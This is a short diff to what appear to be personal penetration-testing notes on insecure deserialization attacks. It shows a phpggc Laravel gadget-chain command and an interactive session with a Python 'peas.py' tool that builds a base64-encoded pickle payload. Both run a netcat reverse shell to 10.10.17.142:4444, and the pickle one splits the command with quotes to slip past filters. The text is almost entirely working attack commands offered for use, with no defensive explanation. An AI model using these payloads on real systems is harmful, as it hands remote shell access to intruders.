@@ -4,6 +4,17 @@ then use the framework suitable , you might need to test more than one
 for example
 phpggc Laravel/RCE9 system 'nc -nv 10.10.17.142 4444 -e /bin/bash' -b
 
+Python
+~/Desktop/scripts/python-..../peas.py
+python3 peas.py 
+Enter RCE command :n''c 10.10.17.142 4444 -e /bin/bas''h
+Enter operating system of target [linux/windows] . Default is linux :
+Want to base64 encode payload ? [N/y] :y
+Enter File location and name to save :pickle
+Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :pickle
+Done Saving file !!!!
+
+
 
 
 
